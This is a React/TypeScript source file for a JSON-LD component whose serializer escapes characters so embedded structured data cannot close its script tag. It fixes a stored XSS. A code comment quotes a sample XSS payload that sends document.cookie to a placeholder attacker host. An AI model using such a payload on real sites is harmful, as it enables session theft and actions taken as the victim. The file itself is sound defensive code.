interface JsonLdProps {
  // Each call site must pass its own unique id (used only as a React key /
  // DOM id, not for any next/script dedup behavior - see below).
  id: string;
  data: Record<string, any>;
}

// Characters that must not reach the HTML parser as themselves once this
// string is sitting inside a <script> element.
//
// The two separators are built from their code points rather than typed as
// literals. U+2028 and U+2029 are invisible: written directly they look
// exactly like a space, so a stray re-encode (or an editor that "cleans up"
// whitespace) silently turns this into a guard that escapes every space in the
// document and nothing else. Keeping the source pure ASCII rules that out.
const LINE_SEPARATOR = String.fromCharCode(0x2028);
const PARAGRAPH_SEPARATOR = String.fromCharCode(0x2029);

const UNSAFE_IN_SCRIPT = new RegExp(`[<>&${LINE_SEPARATOR}${PARAGRAPH_SEPARATOR}]`, "g");
const ESCAPES: Record<string, string> = {
  "<": "\\u003c",
  ">": "\\u003e",
  "&": "\\u0026",
  [LINE_SEPARATOR]: "\\u2028",
  [PARAGRAPH_SEPARATOR]: "\\u2029",
};

/**
 * Serialises structured data for embedding inside a <script> element.
 *
 * JSON.stringify alone is NOT safe here, and using it directly was a stored
 * XSS. JSON has no reason to escape "<", so a value containing the literal
 * text "</script>" is emitted verbatim - and the HTML parser closes the script
 * block at that byte regardless of the JSON syntax around it. Everything after
 * it is parsed as markup. A profile bio, a post body or an article title of
 *
 *     </script><script>fetch("//attacker/?c=" + document.cookie)</script>
 *
 * therefore ran for every visitor who loaded that page. The session cookie is
 * httpOnly, which rules out reading it directly - but the injected script runs
 * same-origin, so it can drive the API as the victim regardless.
 *
 * Escaping "<" to its six-character form produces an identical parsed value
 * (it is a standard JSON string escape, and every consumer unescapes it) while
 * making the sequence impossible to write. ">" and "&" follow so the output is
 * inert in any HTML context, and the two separators because they are legal
 * inside a JSON string but are line terminators to a JavaScript parser.
 */
export function serializeJsonLd(data: unknown): string {
  return JSON.stringify(data).replace(UNSAFE_IN_SCRIPT, (ch) => ESCAPES[ch]);
}

// Deliberately a plain <script> tag, not next/script's <Script>. Structured
// data needs to exist in the raw server-rendered HTML for crawlers that
// don't execute JavaScript, and for the reliability of ones that do.
// next/script's "beforeInteractive" strategy does NOT put the tag in the
// initial HTML at all - it serializes it into a `self.__next_s.push(...)`
// array that only gets turned into a real <script> element client-side
// after hydration, which was confirmed live on this app (curl'd prod HTML
// for "/" showed exactly that JS-array encoding, no actual
// <script type="application/ld+json"> tag present). A plain element in the
// JSX tree, by contrast, is unconditionally part of SSR output.
//
// Every JSON-LD block in the app goes through this component rather than
// hand-rolling the script tag, so the escaping above cannot be forgotten at a
// call site. That is the whole reason it exists - the sites that did roll
// their own are exactly the ones that were injectable.
export function JsonLd({ id, data }: JsonLdProps) {
  return <script id={id} type="application/ld+json" dangerouslySetInnerHTML={{ __html: serializeJsonLd(data) }} />;
}
